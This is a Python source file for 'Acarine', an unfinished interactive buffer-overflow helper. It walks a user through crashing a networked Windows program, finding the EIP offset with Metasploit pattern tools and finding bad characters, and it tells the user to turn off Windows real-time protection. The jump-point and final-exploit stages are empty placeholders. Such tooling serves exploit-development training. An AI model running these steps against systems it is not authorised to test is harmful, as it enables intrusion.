#!/bin/python

# Acarine v0.4.2

# Usage: 
    # Acarine.py -t [IP] -p [PORT]
# Description:
    # Acarine is a Buffer Overflow utility.
    # It is to be used in conjunction with Immunity Debugger and Immunity's Mona module.
# Dependencies:
    # Metasploit Framework Tools
# Unfinished features in development:
    # [4] Finding the Jump Point
    # [5] Final Buffer Overflow Exploit
# Pending Fixes:
    # Error message to be added if incorrect args entered in terminal.

import argparse
import socket
import subprocess
import sys

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

# [@] - Common Functions:

def bufferSend(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        print("\nSending payload...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("\nExecution successful!\n")
        return 0
    except:
        print("Error: Could not connect.\n")
        return 1

def checklist():
    print(f"""\nRecommended pre-testing checklist:
    [*] Run Immunity as Admininistrator
    [*] Set Immunity's working directory [{color.BOLD}{color.YELLOW}!mona config -set workingfolder c:\mona\%p{color.END}]
    [*] Load and Run the vulnerable program in Immunity
    [*] Disable 'Real-time protection' in Windows Security""")
    menu()

def countAdd():
    global count
    count =+ 1

def menu():
    print(f"""\nPlease choose an option from the Menu::
    [{color.DARKCYAN}1{color.END}] Is a Buffer Overflow Possible?
    [{color.DARKCYAN}2{color.END}] Finding EIP and Offset
    [{color.DARKCYAN}3{color.END}] Finding Bad Characters
    [{color.DARKCYAN}4{color.END}] Finding the Jump Point
    [{color.DARKCYAN}5{color.END}] Final Buffer Overflow Exploit
Other Options:    
    [{color.DARKCYAN}C{color.END}] Pre-Testing Checklist\n""")
    
    if count == 0:
        print(f"To return to menu at any point type '{color.DARKCYAN}menu{color.END}'.\n")
        menuInput = input(f"{color.GREEN}[ENTER] to start from [1], OR enter option: {color.END}")
    else:
        menuInput = input(f"{color.GREEN}Enter option: {color.END}")
    countAdd()
    if menuInput == "C" or menuInput == "c":
        checklist()
    elif menuInput == "1" or menuInput == "":
        initialTest()
    elif menuInput == "2":
        offsetTest()
    elif menuInput == "3":
        badCharsTest()
    elif menuInput == "4":    
        jumpPointTest()
    elif menuInput == "5":
        exploitBuffer()
    else:
        print(f"\n{color.RED}Please enter a valid option!{color.END}")
        menu()

def menuCheck(input):
    if input == "menu":
        menu()
    else:
        True

def offsetAvailble():
    try:
        offset
    except NameError:
        offsetEnter()

def offsetEnter():
    global offset
    try:
        offset = int(input(f"{color.RED}\nNo offset variable detected from previous sections.{color.END}\n\n{color.GREEN}Enter offset: {color.END}"))
        return offset
    except:
        print(f"{color.RED}\nOffset must be an Integer! Try again!{color.END}")
        offsetEnter()

# [1] Is a Buffer Overflow Possible?:

def initialTest():
    print(f"""\n{color.BOLD}{color.UNDERLINE}[1] Is a Buffer Overflow Possible?:{color.END}\n
This initial test is to determine whether a buffer overflow is possible, by making 
sure we can overwrite the EIP.\n
The next step will send 5000 'A' characters to the target ('41' in hex).
Upon execution, make sure to check the value of the EIP in Immunity (which should 
be '41414141' if successful)\n
Make sure the program you are testing is now LOADED and RUNNING in Immunity.\n""")
    aCharsInput = input(f"{color.GREEN}[ENTER] to Continue, OR enter number to send: {color.END}")
    menuCheck(aCharsInput)
    if aCharsInput == "":
        aChars = 5000*"A"
    elif aCharsInput != "":
        try:
            aChars = int(aCharsInput)*"A"
        except:
            print(f"{color.RED}\nInput must be an Integer! Reloading section!{color.END}")
            initialTest()  
    if bufferSend(aChars) == 0:
        print(f"""The program should now have crashed and the EIP should read '41414141'.\n
Now we will move on to the finding the EIP and Offset.\n""")
        offsetTest()
    else:
        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
        initialTest()

# [2] Finding the EIP and Offset:

def offsetTest():
    print(f"""\n{color.BOLD}{color.UNDERLINE}[2] Finding the EIP and Offset:{color.END}\n
This section is to find the exact location of the EIP and its offset.\n
To do this we will be sending a pattern of 5000 characters, where upon noting what numbers appear in the EIP
we can then find the exact offset.\n
Make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n""")
    patternInput = input(f"{color.GREEN}[ENTER] to Continue, OR enter number to send: {color.END}")
    menuCheck(patternInput)
    if patternInput == "":
        pattern = 5000
    elif patternInput != "":
        try:
            pattern = int(patternInput)
        except:
            print(f"{color.RED}\nInput must be an Integer! Reloading section!{color.END}")
            offsetTest()
    patternC = subprocess.run(['msf-pattern_create','-l', str(pattern)], capture_output=True, text=True)
    # print(patternC.stdout)
    # bufferSend(patternC.stdout)
    if bufferSend(patternC.stdout) == 0:
        try:
            EIP = int(input(f"{color.GREEN}Enter the value of the EIP: {color.END}"))
        except:
            print(f"{color.RED}\nEIP must be an Integer! Reloading section!{color.END}")
            offsetTest()
        if len(str(EIP)) == 8:
            True
        else:
            print(f"{color.RED}\nEIP must be 8 characters long! Reloading section!{color.END}")
            offsetTest()
    else:
        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
        offsetTest()
    patternO = subprocess.run(['msf-pattern_offset','-l', str(pattern),'-q', str(EIP)], capture_output=True, text=True)
    patternOffsetOutput = patternO.stdout
    print(f"\n{patternOffsetOutput}")
    global offset
    offset = int(patternOffsetOutput[26:])
    # print(offset)
    print(f"""Now we need to test whether we are on target and have indeed successfully discovered the offset.\n
We will now send a payload of Four 'B' characters ('42424242' in hex) with our offset of {offset}.
If we are successful the EIP will read '42424242' as these 'B' should land exactly.\n
Again, make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n""")
    BCharTest = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
    menuCheck(BCharTest)
    offsetLoad = "A" * offset + "B" * 4
    # bufferSend(offsetLoad)
    if bufferSend(offsetLoad) == 0:
        print(f"""The program should now have crashed and the EIP should read '42424242'.\n
This means we are on target and now we will move on to the finding Bad Characters.\n""")
        badCharsTest()
    else:
        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
        offsetTest()
    
# [3] Finding Bad Characters:

def charsMod(charsResultInput):
    global badChars
    toRemove = charsResultInput.split(' ')
    toRemove = list(r'\x' + toRemove for toRemove in toRemove)
    for match in toRemove:
        badChars = badChars.replace(match, '')
    return badChars

def charsPrompt(charsResultInput):
    menuCheck(charsResultInput)
    if charsResultInput == "":
        return badChars
    else:
        charsMod(charsResultInput)

def charsConvert(charsResultInput):
    chars_chars_mod = badChars
    arr = chars_chars_mod.split("\\x")
    arr = "".join(
        chr(int(i,16))
        for i in arr if i
        )
    badCharsLoad = "A" * offset + "B" * 4 + arr
    bufferSend(badCharsLoad)

def badCharsExec(charInp):
    charsPrompt(charInp)
    charsConvert(badChars)

def badCharsTest():
    global badChars
    badChars = r"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    ## Instructions/Intro - Explains BadChars
    print(f"""\n{color.BOLD}{color.UNDERLINE}[3] Finding Bad Characters:{color.END}\n
In this section we will be generating a series of characters that will use to diagnose whether the program
we are testing has any {color.BOLD}Bad Characters{color.END} that need to be eliminated before generating an exploit.""")
    offsetAvailble()
    ## Tells how to make first byte array
    print(f"\nFirst we need to generate a byte array. This will be used to determine any Bad Characters.\n")
    print(rf'To generate a byte array in Immunity enter "{color.YELLOW}!mona bytearray -b "\x00"{color.END}"')
    print(f"""\nAgain, make sure to {color.BOLD}RE-LOAD and RE-RUN{color.END} the program you are testing in Immunity.\n
When ready, a payload of characters will be sent to the target program.\n""")
    ## Test 1: w/o user input:
    charsInitialInput = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
    badCharsExec(charsInitialInput)
    ## Tells how to compare and "please note"
    print(f"This time make note of the {color.BOLD}ESP value.{color.END}\n")
    print(rf"And in Immunity enter '{color.YELLOW}!mona compare -f C:\mona\{color.END}{color.RED}<PROGRAM>{color.END}{color.YELLOW}\bytearray.bin -a {color.END}{color.RED}<ESP>{color.END}'")
    print(f"""\nNow, make note of the characters listed under the 'BadChars' header in the comparison results.\n
Please note:
    [*] The '00' byte has {color.BOLD}already been excluded{color.END} from the byte array, so {color.BOLD}do not{color.END} enter this as a result.
    [*] If two bytes follow each other (e.g. '0a 0b','19 1a', etc) {color.BOLD}only enter the first byte listed{color.END}, as the second may be a false positive.
        If the second byte continues to show as a positive in subsequent testing, then please include it.\n
After making note of the bad character(s), make sure you {color.BOLD}RE-LOAD and RE-RUN{color.END} your target program before continuing.""")
    # Test 2: w/ user input:
    charsResultInput = input(f"\n{color.GREEN}Enter bad characters seperated by spaces, and press [ENTER] to continue.\nOR, if 'Status' header returns 'Unmodified' press [ENTER]: {color.END}")
    badCharsExec(charsResultInput)
    # Test 3: Asks user to either enter if unmodified or enter badchars:
    while True:
        print(rf"Using the {color.BOLD}new ESP{color.END}, enter '{color.YELLOW}!mona compare -f C:\mona\{color.END}{color.RED}<PROGRAM>{color.END}{color.YELLOW}\bytearray.bin -a {color.END}{color.RED}<ESP>{color.END}' again.")
        newCharsResultInput = input(f"\n{color.GREEN}If 'Status' header now returns 'Unmodified' press [ENTER] (or enter remaining BadChars): {color.END}")
        if newCharsResultInput != "":
            badCharsExec(newCharsResultInput)
        elif newCharsResultInput == "":
            break
    jumpPointTest()

# [4] Finding the Jump Point:

def jumpPointTest():
    print("Jump Point Placeholder")
    print(badChars)
    sys.exit()

# [5] Final Buffer Overflow Exploit:

def exploitBuffer():
    print("Exploit Placeholder")
    sys.exit()

# [!] Init:

parser = argparse.ArgumentParser()
parser.add_argument('-t','-T','--target',help="target IP")#,default=socket.gethostname())
parser.add_argument('-p','-P','--port', help="target PORT", type=int)
args = parser.parse_args()

HOST = args.target
PORT = args.port
count = 0

print(f"""{color.BOLD}{color.UNDERLINE}\nWelcome to Acarine!\n{color.END}
This program is a {color.BOLD}Buffer Overflow{color.END} utility. 
To be used in conjunction with {color.BOLD}Immunity Debugger{color.END} and the Immunity's {color.BOLD}Mona module{color.END}.\n
Target is @ {color.BOLD}{color.DARKCYAN}{HOST}:{PORT}{color.END}""")
checklist()
menu()
